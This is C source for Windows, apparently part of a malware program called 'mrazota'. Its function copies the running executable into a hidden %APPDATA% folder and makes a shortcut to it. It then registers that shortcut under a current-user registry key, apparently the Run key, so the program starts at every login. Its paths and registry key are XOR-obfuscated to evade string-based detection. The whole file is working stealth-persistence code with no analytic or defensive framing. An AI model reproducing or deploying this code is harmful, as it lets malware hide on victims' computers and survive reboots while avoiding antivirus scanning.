#include <Windows.h>
#include <malloc.h>
#include <objidl.h>
#include <shobjidl.h>
#include <shlguid.h>
#include "getModulePath.h"
#include "expandEnv.h"

#include "installAndAutorun.h"
BOOL installAndAutorun() {
	static const wchar_t install_unexpanded_a[] = { 0x7339, 0xb91d, 0x8a57, 0x261d, 0xc93d, 0xcdd9, 0x785f, 0x8dce, 0xb938, 0x9a24, 0xb5a9, 0x1b8a, 0x93cf, 0x827f, 0xfc43, 0x2186, 0xbb62, 0x7c54, 0xafdd, 0x70aa, 0x5083, 0x976e, 0x3f52, 0x0f24, 0xaa20, 0xe54c, 0x5db8, 0x7753, 0xcad2 };
	static const wchar_t install_unexpanded_b[] = { 0x8ce3, 0x46a3, 0x75f8, 0xd9b2, 0x3686, 0x3267, 0x87f4, 0x7270, 0x46e2, 0x6587, 0x4a3b, 0xe407, 0x6c51, 0x7dfa, 0x03d3, 0xde0d, 0x44fc, 0x83f7, 0x504f, 0x8f27, 0xaf1d, 0x68eb, 0xc0c2, 0xf0af, 0x55be, 0x1a9d, 0xa222, 0x88d4, 0x3548 };
	wchar_t install_unexpanded[30]; // L"%APPDATA%\\mrazota\\mrazota.exe"
	install_unexpanded[29] = 0;
	for (unsigned int i = 0; i < 29; i++) install_unexpanded[i] = ~(install_unexpanded_a[i] ^ install_unexpanded_b[i]);
	LPWSTR install_path;
	install_path = expandEnv(install_unexpanded);
	if (install_path) {
		DWORD modpath_len;
		LPWSTR modpath;
		modpath = getModulePath(&modpath_len);
		if (modpath) {
			if (wcscmp(install_path, modpath)) {
				HANDLE read_handle;
				read_handle = CreateFileW(modpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				free(modpath);
				if (read_handle) {
					LARGE_INTEGER file_size;
					if (GetFileSizeEx(read_handle, &file_size) && (file_size.HighPart == 0)) {
						LPVOID contents = NULL;
						contents = malloc(file_size.LowPart);
						if (contents && ReadFile(read_handle, contents, file_size.LowPart, NULL, NULL)) {
							CloseHandle(read_handle);
							static const wchar_t dirpath_a[] = { 0x9217, 0xa3f8, 0xe3a3, 0xd39f, 0x2be9, 0x4d37, 0x2bec, 0x47ee, 0x7649, 0xf0e8, 0x5421, 0x69bd, 0x7fa1, 0x87c0, 0x8bff, 0x3c73, 0x2629 };
							static const wchar_t dirpath_b[] = { 0x6dcd, 0x5c46, 0x1c0c, 0x2c30, 0xd452, 0xb289, 0xd447, 0xb850, 0x8993, 0x0f4b, 0xabb3, 0x9630, 0x803f, 0x7845, 0x746f, 0xc3f8, 0xd9b7 };
							wchar_t dirpath[18]; // L"%APPDATA%\\mrazota"
							dirpath[17] = 0;
							for (unsigned int i = 0; i < 17; i++) dirpath[i] = ~(dirpath_a[i] ^ dirpath_b[i]);
							LPWSTR dirpath_exp = NULL;
							dirpath_exp = expandEnv(dirpath);
							if (dirpath_exp) {
								if (CreateDirectoryW(dirpath_exp, NULL) && SetFileAttributesW(dirpath_exp, FILE_ATTRIBUTE_HIDDEN)) {
									HANDLE write_handle;
									write_handle = CreateFileW(install_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
									if (write_handle) {
										if (WriteFile(write_handle, contents, file_size.LowPart, NULL, NULL)) {
											free(contents);
											CloseHandle(write_handle);
											HKEY run_key;
											static const wchar_t run_a[] = { 0xf8b0, 0x4ee7, 0x4129, 0xff17, 0xd29f, 0x5f5b, 0xb599, 0x7137, 0x6338, 0x3806, 0x4453, 0xa6e0, 0xdd61, 0x7749, 0x7c90, 0x7ba5, 0x11d9, 0x943f, 0xc426, 0xeab1, 0x6e73, 0x4f7f, 0x4433, 0x9838, 0x3644, 0x3e9e, 0x13b9, 0x6af5, 0x33d7, 0xe1aa, 0x4874, 0x1d3d, 0x5ad7, 0x5880, 0x9ec0, 0xbeeb, 0x2367, 0x9a81, 0x553c, 0x096a, 0x8e93, 0x0ac6, 0x5e11, 0x9b7c, 0x1671 };
											static const wchar_t run_b[] = { 0x071c, 0xb177, 0xbeb0, 0x009c, 0x2d17, 0xa0c5, 0x4a14, 0x8ead, 0x9c9b, 0xc7b4, 0xbbc5, 0x597c, 0x22ec, 0x88d9, 0x831c, 0x8435, 0xee40, 0x6bb4, 0x3b85, 0x1519, 0x91e5, 0xb0ee, 0xbba8, 0x67a8, 0xc9cc, 0xc112, 0xec1a, 0x9549, 0xcc5d, 0x1e27, 0xb7f9, 0xe2a7, 0xa546, 0xa70b, 0x6169, 0x4171, 0xdcea, 0x650d, 0xaaaa, 0xf6fa, 0x7102, 0xf565, 0xa1bc, 0x64f6, 0xe9e0 };
											wchar_t run[46];
											run[45] = 0;
											for (unsigned int i = 0; i < 45; i++) run[i] = ~(run_a[i] ^ run_b[i]);
											if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_CURRENT_USER, run, 0, KEY_READ | KEY_WRITE, &run_key)) {
												LPWSTR link_path;
												link_path = _wcsdup(install_path);
												if (link_path) {
													DWORD install_len = wcslen(install_path);
													memcpy(link_path + install_len - 3, L"lnk", 3 * sizeof(WCHAR));
													IShellLink* lnk;
													if (SUCCEEDED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_ALL, &IID_IShellLink, &lnk))) {
														IPersistFile* persist;
														if (SUCCEEDED(lnk->lpVtbl->SetPath(lnk, install_path)) && SUCCEEDED(lnk->lpVtbl->QueryInterface(lnk, &IID_IPersistFile, &persist))) {
															persist->lpVtbl->Save(persist, link_path, FALSE);
															if (ERROR_SUCCESS != RegSetValueExW(run_key, L"mrazota", 0, REG_SZ, (BYTE*)link_path, install_len * sizeof(WCHAR))) {
																DeleteFileW(install_path);
																DeleteFileW(dirpath_exp);
															};
															free(link_path);
															RegCloseKey(run_key);
															persist->lpVtbl->Release(persist);
														}
														else {
															free(link_path);
															RegCloseKey(run_key);
															DeleteFileW(install_path);
															DeleteFileW(dirpath_exp);
														};
														lnk->lpVtbl->Release(lnk);
													}
													else {
														free(link_path);
														RegCloseKey(run_key);
														DeleteFileW(install_path);
														DeleteFileW(dirpath_exp);
													};
												}
												else {
													RegCloseKey(run_key);
													DeleteFileW(install_path);
													DeleteFileW(dirpath_exp);
												};
											}
											else {
												DeleteFileW(install_path);
												DeleteFileW(dirpath_exp);
											};
										}
										else {
											free(contents);
											CloseHandle(write_handle);
											DeleteFileW(install_path);
											DeleteFileW(dirpath_exp);
										};
									}
									else {
										free(contents);
										DeleteFileW(dirpath_exp);
									};
								}
								else {
									free(contents);
									DeleteFileW(dirpath_exp);
								};
								free(dirpath_exp);
							}
							else free(contents);
						}
						else {
							free(contents);
							CloseHandle(read_handle);
						}
					}
					else CloseHandle(read_handle);
				};
			}
			else {
				free(modpath);
				free(install_path);
				return TRUE;
			};
		};
		free(install_path);
	};
	return FALSE;
};